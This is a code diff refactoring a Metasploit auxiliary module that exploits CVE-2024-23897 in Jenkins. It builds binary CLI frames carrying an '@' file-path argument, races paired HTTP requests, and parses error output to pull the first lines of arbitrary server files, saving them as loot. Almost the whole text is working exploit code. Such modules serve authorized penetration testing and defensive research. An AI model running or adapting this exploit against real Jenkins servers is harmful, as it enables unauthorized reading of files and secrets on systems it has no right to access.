@@ -4,10 +4,12 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HTTP::Jenkins
+  include Msf::Auxiliary::Report
   prepend Msf::Exploit::Remote::AutoCheck
+
+  CLI_OPERATIONS = { argument: 0, locale: 1, encoding: 2, start: 3, exit: 4, stdout: 7, stderr: 8 }.freeze
 
   def initialize(info = {})
     super(
@@ -111,40 +113,49 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def request_header
-    "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00"
+    cli_frame(CLI_OPERATIONS[:argument], cli_utf('help'))
   end
 
   def request_footer
-    data = []
-    data << "\x00\x00\x00\x07\x02\x00"
-    data << [datastore['ENCODING'].length].pack('C') # length of encoding string
-    data << datastore['ENCODING']
-    data << "\x00\x00\x00\x07\x01\x00"
-    data << [datastore['LOCALITY'].length].pack('C') # length of locality string
-    data << datastore['LOCALITY']
-    data << "\x00\x00\x00\x00\x03"
-    data
+    [
+      cli_frame(CLI_OPERATIONS[:encoding], cli_utf(datastore['ENCODING'])),
+      cli_frame(CLI_OPERATIONS[:locale], cli_utf(datastore['LOCALITY'])),
+      cli_frame(CLI_OPERATIONS[:start])
+    ]
   end
 
   def parameter_one
-    # a literal parameter of 1
-    "\x03\x00\x00\x01\x31\x00\x00\x00"
+    cli_frame(CLI_OPERATIONS[:argument], cli_utf('1'))
   end
 
   def data_generator(pad: false)
     data = []
     data << request_header
     data << parameter_one if pad
-    data << [datastore['FILE_PATH'].length + 3].pack('C').to_s
-    data << "\x00\x00"
-    data << [datastore['FILE_PATH'].length + 1].pack('C').to_s
-    data << "\x40"
-    data << datastore['FILE_PATH']
+    data << cli_frame(CLI_OPERATIONS[:argument], cli_utf("@#{datastore['FILE_PATH']}"))
     data << request_footer
     data.join('')
   end
 
-  def upload_request(uuid, multi_line_file: true)
+  # DataOutputStream.writeUTF uses modified UTF-8: CESU-8 with a two-byte NUL.
+  # https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/DataOutput.html#modified-utf-8
+  def cli_utf(value)
+    data = value.to_s.dup.force_encoding(::Encoding::UTF_8).encode(::Encoding::CESU_8).b.gsub("\x00".b, "\xc0\x80".b)
+    fail_with(Failure::BadConfig, 'Jenkins CLI fields cannot exceed the 65,535-byte Java UTF limit') if data.bytesize > 65_535
+
+    [data.bytesize].pack('n') + data
+  rescue ::Encoding::InvalidByteSequenceError, ::Encoding::UndefinedConversionError => e
+    elog('Failed to encode a Jenkins CLI field', error: e)
+    fail_with(Failure::BadConfig, 'Jenkins CLI fields must contain valid UTF-8 text')
+  end
+
+  # The signed four-byte length excludes both the length field and the opcode.
+  # https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/cli/src/main/java/hudson/cli/PlainCLIProtocol.java
+  def cli_frame(operation, data = ''.b)
+    [data.bytesize, operation].pack('NC') + data
+  end
+
+  def upload_request(uuid, multi_line_file: true, request_data: nil)
     # send upload request asking for file
 
     # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
@@ -162,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
       'vars_get' => {
         'remoting' => 'false'
       },
-      'data' => data_generator(pad: multi_line_file)
+      'data' => request_data || data_generator(pad: multi_line_file)
     )
 
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
@@ -170,7 +181,7 @@ class MetasploitModule < Msf::Auxiliary
     # we don't get a response here, so we just need the request to go through and 200 us
   end
 
-  def process_result(use_pad)
+  def process_result(use_pad, result: nil)
     # the output comes back as follows:
 
     # ERROR: Too many arguments: <line 2>
@@ -184,24 +195,37 @@ class MetasploitModule < Msf::Auxiliary
     # 1 from the file is returned on the last line of output. If padding was used
     # then <line 1> will just be a literal 1
 
-    file_contents = []
-    @content_body.split("\n").each do |html_response_line|
-      # filter for the two lines which have output
-      if html_response_line.include? 'ERROR: Too many arguments'
-        file_contents << html_response_line.gsub('ERROR: Too many arguments: ', '').strip
-      elsif html_response_line.include? 'COMMAND : Name of the command (default:'
-        temp = html_response_line.gsub(' COMMAND : Name of the command (default: ', '')
-        temp = temp.chomp(')').strip
-        file_contents.insert(0, temp)
+    result ||= parse_cli_response(@content_body)
+    file_path = datastore['FILE_PATH'].to_s.dup.force_encoding(::Encoding::UTF_8)
+    unless result[:exit_code] == 2
+      vprint_error('Jenkins CLI did not expose file contents; verify FILE_PATH and read permissions')
+      return
+    end
+
+    first_argument = nil
+    extra_argument = nil
+    result[:stderr].each_line(chomp: true) do |line|
+      if line.start_with?('ERROR: Too many arguments: ')
+        extra_argument = line.delete_prefix('ERROR: Too many arguments: ')
+      elsif (match = line.lstrip.match(/\ACOMMAND : Name of the command \(default: (.*)\)\z/))
+        first_argument = match[1]
       end
     end
-    return if file_contents.empty?
+    if first_argument.nil? || extra_argument.nil?
+      vprint_error('Jenkins CLI did not return the expected file arguments')
+      return
+    end
 
     # if we padded out, then our first line is 1, so drop that
+    file_contents = [first_argument, extra_argument]
     file_contents = file_contents.drop(1) if use_pad == true
+    if file_contents == ["@#{file_path}"]
+      vprint_error('Jenkins CLI did not expand the file argument; the target may be patched')
+      return
+    end
 
-    print_good("#{datastore['FILE_PATH']} file contents retrieved (first line or 2):\n#{file_contents.join("\n")}")
-    stored_path = store_loot('jenkins.file', 'text/plain', rhost, file_contents.join("\n"), datastore['FILE_PATH'])
+    print_good("#{file_path} file contents retrieved (first line or 2):\n#{file_contents.join("\n")}")
+    stored_path = store_loot('jenkins.file', 'text/plain', rhost, file_contents.join("\n"), file_path)
     print_good("Results saved to: #{stored_path}")
   end
 
@@ -226,57 +250,88 @@ class MetasploitModule < Msf::Auxiliary
     @content_body = res.body
   end
 
-  def run
+  def cli_output_encoding
+    ::Encoding.find(datastore['ENCODING'])
+  rescue ArgumentError => e
+    elog('Failed to select Jenkins CLI output encoding', error: e)
+    fail_with(Failure::BadConfig, 'ENCODING must name a supported character encoding')
+  end
+
+  def parse_cli_response(data)
+    # FullDuplexHttpService writes a zero readiness byte before CLI frames.
+    # https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/core/src/main/java/jenkins/util/FullDuplexHttpService.java
+    unless data.is_a?(String) && data.getbyte(0) == 0
+      fail_with(Failure::UnexpectedReply, 'Jenkins CLI response is missing its transport readiness byte')
+    end
+
+    result = { stdout: ''.b, stderr: ''.b, exit_code: nil }
+    offset = 1
+    while offset < data.bytesize
+      fail_with(Failure::UnexpectedReply, 'Jenkins CLI response ended inside a frame header') if data.bytesize - offset < 5
+
+      length, operation = data.byteslice(offset, 5).unpack('l>C')
+      if length.negative? || length > data.bytesize - offset - 5
+        fail_with(Failure::UnexpectedReply, 'Jenkins CLI response contains an invalid or incomplete frame length')
+      end
+      payload = data.byteslice(offset + 5, length)
+      offset += length + 5
+      case operation
+      when CLI_OPERATIONS[:stdout]
+        result[:stdout] << payload
+      when CLI_OPERATIONS[:stderr]
+        result[:stderr] << payload
+      when CLI_OPERATIONS[:exit]
+        unless length == 4 && result[:exit_code].nil?
+          fail_with(Failure::UnexpectedReply, 'Jenkins CLI response contains an invalid or duplicate exit frame')
+        end
+        result[:exit_code] = payload.unpack1('l>')
+      else
+        fail_with(Failure::UnexpectedReply, "Jenkins CLI response contains an unexpected operation: #{operation}")
+      end
+    end
+    fail_with(Failure::UnexpectedReply, 'Jenkins CLI response ended before its exit frame') if result[:exit_code].nil?
+
+    encoding = cli_output_encoding
+    %i[stdout stderr].each do |stream|
+      value = result[stream].force_encoding(encoding)
+      fail_with(Failure::UnexpectedReply, 'Jenkins CLI returned text that is invalid for ENCODING') unless value.valid_encoding?
+
+      result[stream] = value.empty? ? '' : value.encode(::Encoding::UTF_8)
+    end
+    result
+  rescue ::Encoding::InvalidByteSequenceError, ::Encoding::UndefinedConversionError => e
+    elog('Failed to decode Jenkins CLI output', error: e)
+    fail_with(Failure::UnexpectedReply, 'Jenkins CLI returned text that is invalid for ENCODING')
+  end
+
+  def perform_cli_request(pad:)
+    @content_body = nil
+    cli_output_encoding
+    request_data = data_generator(pad: pad)
     uuid = SecureRandom.uuid
-
     print_status("Sending requests with UUID: #{uuid}")
-
-    # Looking over the python PoCs, they all include threading however
-    # the writeup, and PoCs don't mention a timing component.
-    # However, during testing it was found that the two requests need to
-    # hit the server nearly simultaneously, with the 'download' one hitting
-    # first. During testing, even a .1 second slowdown was too much and
-    # the server resulted in a 500 error. So we need to thread these to
-    # execute them fast enough that the server gets both in rapid succession
-
-    use_pad = false
+    # Both HTTP channels must arrive close together, with download first.
     threads = []
-    threads << framework.threads.spawn('CVE-2024-23897', false) do
-      upload_request(uuid, multi_line_file: use_pad) # try single line file first since we get an error if we have more content to get
+    threads << framework.threads.spawn('CVE-2024-23897-upload', false) do
+      upload_request(uuid, multi_line_file: pad, request_data: request_data)
     end
-    threads << framework.threads.spawn('CVE-2024-23897', false) do
-      download_request(uuid)
-    end
+    threads << framework.threads.spawn('CVE-2024-23897-download', false) { download_request(uuid) }
+    threads.each(&:value)
+    parse_cli_response(@content_body) if @content_body
+  ensure
+    threads&.each { |thread| thread.kill if thread.alive? }
+  end
 
-    threads.map do |t|
-      t.join
-    rescue StandardError
-      nil
-    end
-
-    # we got an error that means we need to pad out our value, so rerun with pad
-    if @content_body && @content_body.include?('ERROR: You must authenticate to access this Jenkins.')
+  def run
+    use_pad = false
+    result = perform_cli_request(pad: use_pad)
+    if result && result[:exit_code] == 6 && result[:stderr].include?('ERROR: You must authenticate to access this Jenkins.')
       print_status('Re-attempting with padding for single line output file')
       use_pad = true
-      threads = []
-      threads << framework.threads.spawn('CVE-2024-23897-upload', false) do
-        upload_request(uuid, multi_line_file: use_pad)
-      end
-      threads << framework.threads.spawn('CVE-2024-23897-download', false) do
-        download_request(uuid)
-      end
-
-      threads.map do |t|
-        t.join
-      rescue StandardError
-        nil
-      end
+      result = perform_cli_request(pad: use_pad)
     end
+    return process_result(use_pad, result: result) if result
 
-    if @content_body
-      process_result(use_pad)
-    else
-      print_bad('Exploit failed, no exploit data was successfully returned')
-    end
+    print_bad('Exploit failed, no exploit data was successfully returned')
   end
 end
